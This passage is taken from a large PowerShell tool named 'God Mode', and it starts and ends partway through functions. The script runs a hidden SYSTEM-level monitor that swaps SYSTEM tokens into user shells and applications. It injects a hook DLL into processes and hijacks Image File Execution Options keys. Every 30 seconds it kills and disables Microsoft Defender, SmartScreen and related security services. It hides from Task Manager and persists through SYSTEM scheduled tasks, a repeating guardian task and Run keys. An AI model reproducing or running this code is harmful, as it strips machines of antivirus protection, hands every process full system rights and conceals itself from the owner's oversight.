        Write-DebugLog -FunctionName "Monitor-ElevateProcess" -Action "EXIT" -Message "Success for $procName"
    } else {
        $rootCause = "Monitor service-elevation failed for $procName. sc.exe service creation may be blocked, or the target executable is not valid as a service path. This is expected in some configurations; the process will remain at its current privilege level."
        Write-DebugLog -FunctionName "Monitor-ElevateProcess" -Action "ERROR" -Message "Service-elevation failed for $procName" -RootCause $rootCause
    }
    return $elevated
}

function Start-Monitoring {
    Write-DebugLog -FunctionName "Start-Monitoring" -Action "ENTRY"
    $Flag = Get-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -ErrorAction SilentlyContinue
    if (-not ($Flag -and $Flag.$GodModeFlagRegName -eq 1)) {
        Write-Log -Message "God Mode is not enabled." -Type "ERROR" -Color Red
        Write-DebugLog -FunctionName "Start-Monitoring" -Action "EXIT" -Message "Aborted: flag registry missing"
        return
    }

    # Hide from simple Task Manager view
    Invoke-StealthMode

    Write-Log -Message "Monitoring started with auto-recovery and resurrection killer." -Type "INFO"

    # Critical processes that must never be re-elevated by the periodic loop.
    # Defined here so it is in scope for the periodic elevation block below.
    $CriticalProcs = @("csrss.exe", "lsass.exe", "services.exe", "smss.exe", "winlogon.exe", "wininit.exe", "svchost.exe", "taskhostw.exe", "sihost.exe", "dwm.exe", "fontdrvhost.exe", "Memory Compression", "Registry", "System", "Secure System", "powershell.exe", "pwsh.exe", "cmd.exe", "powershell_ise.exe", "conhost.exe", "explorer.exe", "ShellHost.exe", "ctfmon.exe", "VBoxTray.exe", "ApplicationFrameHost.exe", "RuntimeBroker.exe", "SearchIndexer.exe", "SearchProtocolHost.exe")
    # Interactive shells -- the WMI process-creation watcher's actual targets.
    # CriticalProcs (above) lists them so the 15s periodic scan SKIPs them (no
    # kill+relaunch), but the event-driven + 5s-polling drains MUST still elevate
    # them in-place. $shellNames exempts them from the CriticalProcs guard below.
    $shellNames = @("cmd.exe", "powershell.exe", "pwsh.exe", "powershell_ise.exe")

    $lastElevated = @{}   # Process path -> last elevated time (for startup/periodic scans)
    $lastElevatedPid = @{} # Process ID -> elevated time (for new process detection)
    $lastKillCheck = [datetime]::MinValue
    $lastExistingElevate = [datetime]::MinValue
    $lastPidCleanup = [datetime]::MinValue
    $lastReconcile = [datetime]::MinValue
    $loopCount = 0
    $lastNewProcPoll = [datetime]::MinValue
    $lastWatcherHealthCheck = [datetime]::MinValue
    $lastWatcherBeats = 0
    $isSystem = ([Environment]::UserName -eq "SYSTEM") -or (([Security.Principal.WindowsIdentity]::GetCurrent().User.Value) -eq "S-1-5-18")
    if (-not $isSystem) {
        Write-Log -Message "Monitor is running as Administrator (not SYSTEM). Elevation blocks will be skipped; only resurrection-killer and stealth mode are active." -Type "WARN" -Color Yellow
    }
    # --- Monitor-loop-startup TokenOps availability debug (the "add debug if it
    #     even fails" surface). Reports whether this monitor CAN elevate shells
    #     in-place via ReplaceProcessTokenForPid. If TokenOps failed to compile
    #     (the concurrent-Add-Type OOM root cause), Assert-TokenOpsAvailable logs
    #     a loud ERROR with the stored compile reason so the SYSTEM-temp monitor
    #     log (collected by option 11) shows the exact failure without a manual
    #     probe. The monitor SURVIVES either way (Assert returns $false, callers
    #     degrade gracefully) -- this just makes the root cause visible at
    #     monitor startup. Only meaningful as SYSTEM (an admin monitor cannot
    #     elevate regardless). ---
    if ($isSystem) {
        if (Assert-TokenOpsAvailable -Caller 'Start-Monitoring') {
            Write-DebugLog -FunctionName "Start-Monitoring" -Action "INFO" -Message "TokenOps available -- monitor can elevate shells in-place via ReplaceProcessTokenForPid (Phase 0) + born-as-SYSTEM (Phase 1)."
        }
    }

    # --- GmProxy graceful-fallback feedback listener: receives PIDs from gmproxy.exe
    #     (named pipe GodMode-GmProxyFeedback) and drains them into
    #     $script:GmProxyFeedbackQueue for in-place SYSTEM elevation, avoiding the
    #     15s periodic scan kill+relaunch duplicate. Only meaningful as SYSTEM. ---
    if ($isSystem) {
        $null = Start-GmProxyFeedbackListener
        $null = Start-IfeoNewAppWatcher
        # Event-driven WMI process-creation watcher: the SOLE fast elevator for
        # interactive shells (cmd/powershell/pwsh/powershell_ise -- console/UI apps
        # the global WH_GETMESSAGE hook does not auto-inject, removed from IFEO so
        # they are not born via gmproxy). It enqueues new Session>0 .exe PIDs; the
        # loop below drains them into Monitor-ElevateProcess Phase 0 (in-place
        # ReplaceProcessTokenForPid token swap). MUST live in THIS persistent
        # monitor process (the scheduled task), not only in Enable-GodMode (a
        # one-shot activator that exits) -- otherwise the watcher dies with the
        # activator and shells are never event-elevated. PS7 delivery uses a background
        # ThreadJob + ManagementEventWatcher.WaitForNextEvent() (Register-ObjectEvent
        # -Action does NOT pump in a non-interactive scheduled-task runscape; see
        # Register-ProcessCreationWatcher). The 5s polling fallback below runs
        # UNCONDITIONALLY (throttled) as a guaranteed safety net so a dead watcher
        # never strands interactive shells.
        $null = Register-ProcessCreationWatcher
    }

    # --- One-time elevation of all existing user-session processes at startup.
    #     Wrapped in try/catch (defense-in-depth): a startup-elevation failure
    #     can NEVER kill the monitor loop (the critical asset -- without it,
    #     NOTHING elevates). Invoke-ExistingProcessElevation's own Assert guards
    #     the TokenOps path, but a WMI/CIM hiccup here must not propagate out of
    #     Start-Monitoring before the while loop starts (the global trap
    #     { ... break } would otherwise terminate the whole monitor). ---
    try {
        Invoke-ExistingProcessElevation
    } catch {
        Write-DebugLog -FunctionName "Start-Monitoring" -Action "ERROR" -Message "Invoke-ExistingProcessElevation threw at startup (continuing into the monitor loop): $($_.Exception.Message)" -ErrorRecord $_
        Write-Log -Message "Startup elevation threw (continuing into the monitor loop): $($_.Exception.Message)" -Type "WARN" -Color Yellow
    }

    while ($true) {
        try {
            # --- Fast event-driven elevation: drain WMI process-creation queue ---
            if ($script:ProcessCreationWatcherActive -and $script:ProcessCreationQueue -ne $null -and $script:ProcessCreationQueue.Count -gt 0) {
                while ($script:ProcessCreationQueue.Count -gt 0) {
                    # $script:ProcessCreationQueue is a Synchronized ArrayList (see
                    # init at top of file), NOT a Queue/ConcurrentQueue -- it has NO
                    # TryDequeue method. The earlier TryDequeue call here threw on
                    # every tick once the PS7 Register-ObjectEvent fix actually
                    # started populating the queue (the registration bug had masked
                    # it: the queue was always empty, so TryDequeue was never
                    # called). The throw was caught by the loop's catch -> 5s sleep
                    # -> retry -> throw again, so the watcher enqueued shells but the
                    # drain never dequeued them and no shell was ever elevated. Use
                    # the [0]+RemoveAt(0) pattern (same as GmProxyFeedbackQueue and
                    # IfeoNewAppQueue drains below).
                    $evt = $script:ProcessCreationQueue[0]
                    $script:ProcessCreationQueue.RemoveAt(0)
                    if ($evt -and $evt.ProcessId -gt 0 -and $evt.ExecutablePath -and $evt.ExecutablePath -like "*.exe") {
                        $procBase = [System.IO.Path]::GetFileName($evt.ExecutablePath)
                        # Guard: never in-place-swap truly-critical desktop processes
                        # (dwm/explorer/conhost/ctfmon/ShellHost/...) -- swapping
                        # explorer/dwm to SYSTEM breaks the taskbar/desktop. But DO
                        # elevate the interactive shells ($shellNames exempts them
                        # from this guard). Non-shell non-critical apps are left to
                        # the 15s periodic scan; auto-excluded apps (AppX stubs the
                        # store learned are SYSTEM-incompatible) are skipped too,
                        # mirroring the periodic scan guards at L6941/L6945.
                        if (($CriticalProcs -contains $procBase) -and ($shellNames -notcontains $procBase)) { continue }
                        if (Test-GmAutoExcluded $procBase) { continue }
                        $path = $evt.ExecutablePath
                        $arguments = $evt.Arguments
                        if (-not $lastElevatedPid.ContainsKey($evt.ProcessId)) {
                            $lastElevatedPid[$evt.ProcessId] = Get-Date
                            $meResult = Monitor-ElevateProcess -Path $path -Arguments $arguments -ProcessId $evt.ProcessId -HideWindow
                            # Interactive shells: if EVERY elevation phase failed
                            # (transient -- no SYSTEM token source this instant),
                            # clear the dedup so the next 5s polling tick retries.
                            # The admin shell is still alive (Phase 1 only kills on
                            # success); the user expects whoami -> SYSTEM after
                            # [7]+reboot, so a transient failure must not strand it.
                            if (-not $meResult -and ($shellNames -contains $procBase)) {
                                $lastElevatedPid.Remove($evt.ProcessId) | Out-Null
                            }
                        }
                    }
                }
            }
            # --- GmProxy graceful-fallback feedback: in-place elevation of PIDs handed
            #     off by gmproxy.exe (no kill+relaunch duplicate). ---
            if ($script:GmProxyFeedbackQueue -and $script:GmProxyFeedbackQueue.Count -gt 0) {
                while ($script:GmProxyFeedbackQueue.Count -gt 0) {
                    $fbPid = [int]$script:GmProxyFeedbackQueue[0]
                    $script:GmProxyFeedbackQueue.RemoveAt(0)
                    if ($fbPid -gt 0 -and -not $lastElevatedPid.ContainsKey($fbPid)) {
                        $lastElevatedPid[$fbPid] = Get-Date
                        Invoke-GmProxyFeedbackElevation -ProcessId $fbPid
                    }
                }
            }
            # --- INSTANT interactive-shell elevation: gmhook (injected into explorer +
            #     user GUI hosts) signals a shell CHILD's PID the moment it is born
            #     (SHELLPID=<n> over the GodMode-GmProxyFeedback pipe; the listener
            #     routes it to $GmHookShellQueue). Drain it here -> in-place SYSTEM
            #     token swap (Invoke-GmHookShellFeedbackElevation) within the loop
            #     tick (~<=500ms), instead of waiting for the WMI/3s/15s scan. This
            #     is the FAST path for the primary user case (Start menu / Win+R /
            #     shortcut -> explorer launches the shell); the WMI watcher + 3s/15s
            #     scans remain the guaranteed fallback if gmhook is not injected into
            #     the launching host. Shell-retry-on-failure mirrors the WMI drain:
            #     if the in-place swap fails (transient -- no SYSTEM token source),
            #     clear the dedup so the next tick retries (the shell is still alive). ---
            if ($script:GmHookShellQueue -and $script:GmHookShellQueue.Count -gt 0) {
                while ($script:GmHookShellQueue.Count -gt 0) {
                    $shPid = [int]$script:GmHookShellQueue[0]
                    $script:GmHookShellQueue.RemoveAt(0)
                    if ($shPid -gt 0 -and -not $lastElevatedPid.ContainsKey($shPid)) {
                        $lastElevatedPid[$shPid] = Get-Date
                        $shResult = Invoke-GmHookShellFeedbackElevation -ProcessId $shPid
                        # Transient failure (no SYSTEM token source / TokenOps not ready):
                        # clear the dedup so the next WMI/3s/15s tick retries. The shell
                        # is still alive (Invoke-GmHookShellFeedbackElevation never kills).
                        if (-not $shResult) {
                            $lastElevatedPid.Remove($shPid) | Out-Null
                        }
                    }
                }
            }
            # --- Instant IFEO new-app watcher drain: FileSystemWatcher enqueues newly-
            #     installed .exe paths; Add-IfeoElevationForApp hooks them idempotently
            #     (only genuinely-new apps, never retrigger). Sentinel -> catch-up rescan. ---
            if ($script:IfeoNewAppWatcherActive -and $script:IfeoNewAppQueue -and $script:IfeoNewAppQueue.Count -gt 0) {
                while ($script:IfeoNewAppQueue.Count -gt 0) {
                    $newPath = [string]$script:IfeoNewAppQueue[0]
                    $script:IfeoNewAppQueue.RemoveAt(0)
                    if (-not $newPath) { continue }
                    if ($newPath -eq '__GMIFEO_RESCAN__') {
                        $null = Install-IfeoElevation
                        continue
                    }
                    $nb = [System.IO.Path]::GetFileName($newPath)
                    if (-not $nb) { continue }
                    $nbKey = $nb.ToLower()
                    $now = [datetime]::Now
                    if ($script:IfeoNewAppDebounce.ContainsKey($nbKey)) {
                        try {
                            $last = [datetime]$script:IfeoNewAppDebounce[$nbKey]
                            if ($last -gt $now.AddMilliseconds(-500)) { continue }
                        } catch {}
                    }
                    $script:IfeoNewAppDebounce[$nbKey] = $now
                    $null = Add-IfeoElevationForApp -AppExePath $newPath
                }
            }
            # --- Deferred IFEO stale-prune drain: when a watched .exe is Deleted,
            #     the watcher enqueues a prune entry with a ~5s grace period (so an
            #     updater's new .exe lands first). After the grace period we re-scan
            #     the watched dirs for that base name; the gmproxy IFEO key is removed
            #     ONLY if the .exe is gone everywhere (gmproxy-guarded, never touches
            #     unrelated keys). If the .exe reappeared (update), drop the entry --
            #     the new .exe's Created event re-hooked it; no retrigger. ---
            if ($script:IfeoNewAppWatcherActive -and $script:IfeoPruneQueue -and $script:IfeoPruneQueue.Count -gt 0) {
                $nowPrune = [datetime]::Now
                $processedBases = @{}
                for ($pi = $script:IfeoPruneQueue.Count - 1; $pi -ge 0; $pi--) {
                    $entry = $null
                    try { $entry = $script:IfeoPruneQueue[$pi] } catch {}
                    if (-not $entry) { continue }
                    # Not yet due -> leave for a future tick (grace period still running).
                    if ($entry.DueTime -gt $nowPrune) { continue }
                    $pBase = $entry.BaseName
                    if (-not $pBase) { $script:IfeoPruneQueue.RemoveAt($pi); continue }
                    # Dedupe per base name this tick (multiple Deleted events for the
                    # same app collapse into one prune check).
                    $pKey = $pBase.ToLower()
                    if ($processedBases.ContainsKey($pKey)) { $script:IfeoPruneQueue.RemoveAt($pi); continue }
                    $processedBases[$pKey] = $true
                    $script:IfeoPruneQueue.RemoveAt($pi)
                    # Cheap pre-check: only the expensive re-scan if a gmproxy IFEO
                    # key actually exists for this base name. No key / non-gmproxy
                    # debugger -> nothing to prune (no retrigger, never touches
                    # unrelated IFEO keys).
                    $pIfeoBase = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
                    $pAppKey = Join-Path $pIfeoBase $pBase
                    $pDebugger = $null
                    if (Test-Path $pAppKey) {
                        try { $pDebugger = (Get-ItemProperty -Path $pAppKey -Name "Debugger" -ErrorAction SilentlyContinue).Debugger } catch {}
                    }
                    if (-not $pDebugger -or $pDebugger -notlike "*gmproxy*") { continue }
                    # Re-scan: is the .exe truly gone everywhere?
                    if (Test-BaseNameGoneEverywhere -BaseName $pBase) {
                        $null = Remove-IfeoElevationForApp -BaseName $pBase
                    }
                    # Else: .exe reappeared (updater wrote the new copy) -> no-op,
                    # the Created event already re-hooked it. No retrigger.
                }
            }
            Start-Sleep -Milliseconds 500
            $loopCount++
            if ($loopCount % 120 -eq 0) {
                Write-Log -Message "Monitor heartbeat: loop $loopCount, PIDs tracked: $($lastElevatedPid.Count)" -Type "INFO" -Color Gray
            }

        # --- Cleanup old PID entries to prevent memory growth ---
            if ((Get-Date) - $lastPidCleanup -gt [TimeSpan]::FromMinutes(2)) {
                $lastPidCleanup = Get-Date
                $now = Get-Date
                $oldPids = $lastElevatedPid.GetEnumerator() | Where-Object { $_.Value -lt $now.AddMinutes(-5) } | Select-Object -ExpandProperty Key
                # $procId, NOT $pid -- $pid is the read-only automatic $PID
                # (case-insensitive: $pid IS $PID); assigning it throws "Cannot
                # overwrite variable PID" and faults the monitor loop (caught by
                # the loop catch -> 5s recovery -> skips the resurrection-killer
                # + periodic elevation that tick).
                foreach ($procId in $oldPids) { $lastElevatedPid.Remove($procId) | Out-Null }
            }

            # --- WMI watcher liveness heartbeat (every 30s): verify the watcher
            #     ThreadJob is alive + delivering, and auto-re-register if it died.
            #     The 5s polling fallback (always on) guarantees shells are never
            #     stranded, but a healthy watcher gives ~1s latency vs ~3s polling,
            #     so re-registering a dead watcher restores the fast path. Beats =
            #     events the ThreadJob copied into the queue (delivery proof). ---
            if ((Get-Date) - $lastWatcherHealthCheck -gt [TimeSpan]::FromSeconds(30)) {
                $lastWatcherHealthCheck = Get-Date
                $beatsNow = 0
                try { $beatsNow = [int]$script:ProcessCreationWatcherState.Beats } catch {}
                $beatsDelta = $beatsNow - $lastWatcherBeats
                $lastWatcherBeats = $beatsNow
                $jobAlive = $false
                if ($script:ProcessCreationWatcherJob) {
                    try { $jobAlive = ($script:ProcessCreationWatcherJob.State -eq 'Running') } catch {}
                }
                if ($script:ProcessCreationWatcherActive -and -not $jobAlive) {
                    Write-Log -Message "WMI watcher ThreadJob died (State=$($script:ProcessCreationWatcherJob.State)); re-registering for fast shell elevation (5s polling fallback remains active)." -Type "WARN" -Color Yellow
                    Write-DebugLog -FunctionName "Start-Monitoring" -Action "WARN" -Message "Watcher ThreadJob not Running; re-registering (beatsTotal=$beatsNow)"
                    $null = Register-ProcessCreationWatcher
                } else {
                    Write-DebugLog -FunctionName "Start-Monitoring" -Action "INFO" -Message "Watcher heartbeat: alive=$jobAlive beatsTotal=$beatsNow beatsDelta30s=$beatsDelta queueLen=$($script:ProcessCreationQueue.Count) watcherActive=$script:ProcessCreationWatcherActive"
                }
            }

            # --- Resurrection Killer: Re-kill security services if they respawn (every 30 seconds) ---
            if ((Get-Date) - $lastKillCheck -gt [TimeSpan]::FromSeconds(30)) {
                $lastKillCheck = Get-Date
                $ServicesToKill = @("MsMpEng", "MsMpEngCP", "MpDefenderCoreService", "MsSense", "smartscreen", "SecurityHealthService", "MpCmdRun", "NisSrv", "SgrmBroker", "WerFault", "WerFaultSecure", "WaaSMedic", "SecurityHealthSystray")
                foreach ($procName in $ServicesToKill) {
                    try {
                        Get-Process -Name $procName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
                    } catch { }
                }
                # Re-apply service-level disable if any service got re-enabled
                $DefenderServices = @("WinDefend", "WdNisSvc", "wscsvc", "SecurityHealthService", "Sense", "MDCoreSvc", "WaaSMedicSvc", "usosvc", "WerSvc", "DPS", "BITS", "NisSrv", "SgrmBroker")
                foreach ($svc in $DefenderServices) {
                    try {
                        $svcObj = Get-Service -Name $svc -ErrorAction SilentlyContinue
                        if ($svcObj -and $svcObj.Status -eq 'Running') {
                            Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
                            Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
                            Write-Log -Message "Resurrection killer: re-disabled $svc" -Type "INFO" -Color Gray
                        }
                    } catch { }
                }
            }

            # --- Auto-exclude store reconciliation (every 5 minutes): drop
            #     orphaned install-time AppX/Store-stub entries (reason 'A')
            #     whose stub + alias no longer exist (the Store app was
            #     uninstalled) AND stale install-time browser entries (reason
            #     'P') whose registered StartMenuInternet client vanished (the
            #     browser was uninstalled), so the store stays tidy instead of
            #     carrying a stale excluded=1 entry for up to 30 days. Never
            #     touches runtime C/G entries (those are governed by gmproxy.c's
            #     30-day stale drop). Fail-open. ---
            if ((Get-Date) - $lastReconcile -gt [TimeSpan]::FromMinutes(5)) {
                $lastReconcile = Get-Date
                $null = Invoke-GmAutoExcludeReconcile
            }

            # --- Periodic Existing Process Elevation: Re-elevate every 15 seconds ---
            if ($isSystem -and ((Get-Date) - $lastExistingElevate -gt [TimeSpan]::FromSeconds(15))) {
                $lastExistingElevate = Get-Date
                $ExistingProcesses = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.SessionId -gt 0 -and $_.ExecutablePath -and $_.ExecutablePath -like "*.exe" }

                # Build due list (detect first, then set in parallel)
                $dueProcesses = @()
                foreach ($proc in $ExistingProcesses) {
                    $procName = [System.IO.Path]::GetFileName($proc.ExecutablePath)
                    if ($CriticalProcs -contains $procName) { continue }
                    # Detector B store consult: skip auto-excluded base names so
                    # the 15s periodic scan does NOT re-elevate an app gmproxy
                    # learned is SYSTEM-incompatible. Fail-open (missing store).
                    if (Test-GmAutoExcluded $procName) { continue }
                    $path = $proc.ExecutablePath
                    if (-not $lastElevated.ContainsKey($path) -or $lastElevated[$path] -lt (Get-Date).AddSeconds(-15)) {
                        $lastElevated[$path] = Get-Date
                        $dueProcesses += $proc
                    }
                }

                if ($dueProcesses.Count -gt 0) {
                    Enable-ElevationPrivileges
                    Invoke-TokenOpsPrivilege -PrivilegeName "SeIncreaseQuotaPrivilege" | Out-Null
                    $systemPid = Find-SystemProcessCandidate
                    if ($systemPid -ne 0) {
                        $results = Invoke-ParallelElevation -Targets $dueProcesses -systemPid $systemPid -HideWindow
                        $successCount = ($results | Where-Object { $_.Result -eq "SUCCESS" }).Count
                        $failCount = ($results | Where-Object { $_.Result -eq "FAIL" }).Count
                        $skipCount = ($results | Where-Object { $_.Result -eq "SKIP" }).Count
                        if ($successCount -gt 0 -or $failCount -gt 0) {
                            Write-Log -Message "Periodic parallel elevation: $successCount succeeded, $failCount failed, $skipCount skipped." -Type "INFO" -Color Gray
                        }
                    } else {
                        Write-Log -Message "Periodic scan: No SYSTEM token available, falling back to sequential." -Type "WARN" -Color Yellow
                        foreach ($proc in $dueProcesses) {
                            $path = $proc.ExecutablePath
                            $arguments = ""
                            if ($proc.CommandLine) {
                                $cmdLine = $proc.CommandLine
                                if ($cmdLine.StartsWith('"')) {
                                    $endQuote = $cmdLine.IndexOf('"', 1)
                                    if ($endQuote -gt 0 -and $endQuote -lt $cmdLine.Length - 1) {
                                        $arguments = $cmdLine.Substring($endQuote + 1).Trim()
                                    }
                                } else {
                                    $firstSpace = $cmdLine.IndexOf(' ')
                                    if ($firstSpace -gt 0) {
                                        $arguments = $cmdLine.Substring($firstSpace + 1).Trim()
                                    }
                                }
                            }
                            Monitor-ElevateProcess -Path $path -Arguments $arguments -HideWindow
                        }
                    }
                }
            }

        # --- New Process Elevation (5s polling -- GUARANTEED safety net, runs unconditionally) ---
        # Runs regardless of $ProcessCreationWatcherActive (throttled to ~3s via
        # $lastNewProcPoll). Previously gated on `-not $ProcessCreationWatcherActive`,
        # which meant a watcher that REGISTERED (Active=$true) but never DELIVERED
        # (PS7 -Action pump failure / ThreadJob death) left interactive shells with NO
        # elevation path -- they stayed admin (whoami -> admin). Now the watcher is the
        # FAST path (~1s, event-driven) and this polling is the GUARANTEED path (~3s,
        # direct WMI query); $lastElevatedPid dedup prevents double-elevation when both
        # catch the same PID, and Invoke-ParallelElevation's SYSTEM-instance check
        # prevents the 15s scan from kill+relaunching an already-SYSTEM app.
        $newProcesses = @()
        if ($isSystem -and ((Get-Date) - $lastNewProcPoll -gt [TimeSpan]::FromSeconds(3))) {
            $lastNewProcPoll = Get-Date
            $Now = Get-Date
            $newProcesses = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
                try {
                    $_.SessionId -gt 0 -and
                    $_.CreationDate -and
                    ([System.Management.ManagementDateTimeConverter]::ToDateTime($_.CreationDate)) -gt $Now.AddSeconds(-5)
                } catch { $false }
            }
        }

        foreach ($proc in $newProcesses) {
            if ($proc.ExecutablePath -and $proc.ExecutablePath -like "*.exe") {
                $pollBase = [System.IO.Path]::GetFileName($proc.ExecutablePath)
                # Same guard as the WMI watcher drain: never in-place-swap critical
                # desktop processes (dwm/explorer/conhost/...) but DO elevate the
                # interactive shells ($shellNames exempts them); skip auto-excluded
                # AppX stubs too -- mirrors the periodic scan guards at L6941/L6945.
                if (($CriticalProcs -contains $pollBase) -and ($shellNames -notcontains $pollBase)) { continue }
                if (Test-GmAutoExcluded $pollBase) { continue }
                $path = $proc.ExecutablePath
                $arguments = ""
                if ($proc.CommandLine) {
                    $cmdLine = $proc.CommandLine
                    # Extract arguments from command line
                    if ($cmdLine.StartsWith('"')) {
                        $endQuote = $cmdLine.IndexOf('"', 1)
                        if ($endQuote -gt 0 -and $endQuote -lt $cmdLine.Length - 1) {
                            $arguments = $cmdLine.Substring($endQuote + 1).Trim()
                        }
                    } else {
                        $firstSpace = $cmdLine.IndexOf(' ')
                        if ($firstSpace -gt 0) {
                            $arguments = $cmdLine.Substring($firstSpace + 1).Trim()
                        }
                    }
                }

                # PID-based tracking: each process instance gets elevated once.
                # Pass -ProcessId so Monitor-ElevateProcess Phase 0 can do an in-place
                # token swap (no kill) for interactive shells -- mirrors the WMI watcher
                # drain. Without it, shells would fall through to the kill+relaunch
                # Phase 1/2 path (loses the user's session/cwd/history).
                if (-not $lastElevatedPid.ContainsKey($proc.ProcessId)) {
                    $lastElevatedPid[$proc.ProcessId] = Get-Date
                    $meResult = Monitor-ElevateProcess -Path $path -Arguments $arguments -ProcessId $proc.ProcessId -HideWindow
                    # Interactive shells: retry on total failure (mirrors the WMI
                    # watcher drain above) so a transient "no SYSTEM token source"
                    # does not strand the shell as admin forever. The 3s polling
                    # throttle bounds the retry rate; once a SYSTEM token source
                    # appears the shell is elevated (in-place or born-as-SYSTEM).
                    if (-not $meResult -and ($shellNames -contains $pollBase)) {
                        $lastElevatedPid.Remove($proc.ProcessId) | Out-Null
                    }
                }
            }
        }
        }
        catch {
            Write-DebugLog -FunctionName "Start-Monitoring" -Action "ERROR" -Message "Loop exception" -ErrorRecord $_
            Write-Log -Message "Monitoring error (recovering in 5s): $_" -Type "ERROR" -Color Red
            Start-Sleep -Seconds 5
        }
    }
}

function Enable-GodMode {
    Write-DebugLog -FunctionName "Enable-GodMode" -Action "ENTRY"

    # Ensure the installed script is up-to-date before registering tasks that depend on it
    if (-not (Test-Path $GodModeInstallDir)) { New-Item -ItemType Directory -Path $GodModeInstallDir -Force | Out-Null }
    try {
        Copy-Item -Path $PSCommandPath -Destination $GodModeInstallScript -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Updated installed script at $GodModeInstallScript" -Type "INFO" -Color Gray
    } catch {
        Write-DebugLog -FunctionName "Enable-GodMode" -Action "WARN" -Message "Could not update installed script: $_"
    }

    # --- Install C process hook FIRST before any dangerous system changes or idempotency skip.
    #     The WH_GETMESSAGE hook and DLL injection do NOT survive reboot. Every startup
    #     (manual or via scheduled task -ToggleOn) must rebuild/re-install gmhook.dll and
    #     re-inject into running processes. This is the critical gate: if build fails,
    #     the rest of the script must NOT proceed. ---
    $HookOk = Install-ProcessHook
    if (-not $HookOk) {
        # Abort-log MUST be best-effort: as SYSTEM (scheduled-task -ToggleOn
        # relaunch) the user Desktop folder resolves to "" (SYSTEM has no
        # profile), and Join-Path with an empty -Path throws "Cannot bind
        # argument to parameter 'Path'..." as an UNCAUGHT TRAP -- which kills
        # the -ToggleOn relaunch before persistence/monitoring are re-asserted.
        # Resolve a writable dir via Get-GodModeLogDir + guard the write so a
        # logging failure can never abort the activation path with an uncaught trap.
        try {
            $AbortLog = Join-Path (Get-GodModeLogDir) "GodMode_CompilerError.log"
            @"
[ERROR] God Mode activation aborted - C component build/install failed.

Install-ProcessHook returned failure. Check GodMode_DriverBuild.log for build details.

To fix:
1. Check that MSYS2 is installed correctly and gcc is available
2. Or install Visual Studio Build Tools
3. Then press [7] again

No system modifications were applied (Defender, registry, etc. remain untouched).
"@ | Out-File -FilePath $AbortLog -Encoding UTF8 -Force -ErrorAction SilentlyContinue
            Write-Log -Message "C hook installation failed. God Mode activation aborted. Details: $AbortLog" -Type "ERROR" -Color Red
        } catch {
            Write-DebugLog -FunctionName "Enable-GodMode" -Action "WARN" -Message "Abort-log write failed: $_"
        }
        Write-DebugLog -FunctionName "Enable-GodMode" -Action "ERROR" -Message "Install-ProcessHook failed - aborting God Mode activation"
        return
    }

    # --- Idempotency: if God Mode is already enabled and the monitoring loop is
    #     running, skip re-registration. This prevents the many -ToggleOn
    #     persistence layers (startup tasks, guardian, WMI) from killing the
    #     Start-Monitoring loop via Register-StealthTask -> Unregister-StealthTask.
    #     Without this, the loop flaps constantly after reboot and never elevates.
    #     NOTE: Install-ProcessHook already ran above (hooks don't survive reboot). ---
    $FlagAlreadySet = $false
    try {
        $ExistingFlag = Get-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -ErrorAction SilentlyContinue
        if ($ExistingFlag -and $ExistingFlag.$GodModeFlagRegName -eq 1) { $FlagAlreadySet = $true }
    } catch {}
    if ($FlagAlreadySet) {
        $RunningMonitor = Get-ScheduledTask -TaskName "$GodModeTaskPrefix*" -ErrorAction SilentlyContinue |
            Where-Object { $_.State -eq 'Running' }
        if ($RunningMonitor) {
            Write-Log -Message "God Mode already enabled and monitor running ($($RunningMonitor.TaskName)). Skipping re-registration to prevent flapping." -Type "INFO" -Color Gray
            Write-DebugLog -FunctionName "Enable-GodMode" -Action "EXIT" -Message "Idempotent skip (monitor already running)"
            return
        }
    }

    # Ensure main task and guardian exist (for users who press 7 without 6)
    if (-not (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue)) {
        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
        $Trigger1 = New-ScheduledTaskTrigger -AtStartup
        $Trigger2 = New-ScheduledTaskTrigger -AtLogOn
        $PrincipalSettings = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $GodModeTaskName -Action $Action -Trigger @($Trigger1, $Trigger2) -Principal $PrincipalSettings -Force | Out-Null
        Write-Log -Message "Main God Mode task auto-registered." -Type "INFO" -Color Gray
    }
    if (-not (Get-ScheduledTask -TaskName $GodModeGuardianName -ErrorAction SilentlyContinue)) {
        $GuardianAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
        $GuardianTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 9999)
        $GuardianPrincipal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $GodModeGuardianName -Action $GuardianAction -Trigger $GuardianTrigger -Principal $GuardianPrincipal -Force | Out-Null
        Write-Log -Message "God Mode guardian auto-registered." -Type "INFO" -Color Gray
    }

    # --- If we reach here, this is a fresh activation (not an idempotent skip). ---
    #     Dangerous mode changes only happen once; hooks are already re-installed above.

    if (-not (Test-Path $GodModeFlagRegPath)) { New-Item -Path $GodModeFlagRegPath -Force | Out-Null }
    Set-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -Value 1 -Force -ErrorAction SilentlyContinue
    Enable-DangerousMode
    Invoke-ExistingProcessElevation
    Register-StealthTask

    # --- Registry Persistence (Run keys) ---
    Write-Log -Message "Setting registry persistence keys..." -Type "INFO" -Color Gray
    $ScriptCmd = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
    try {
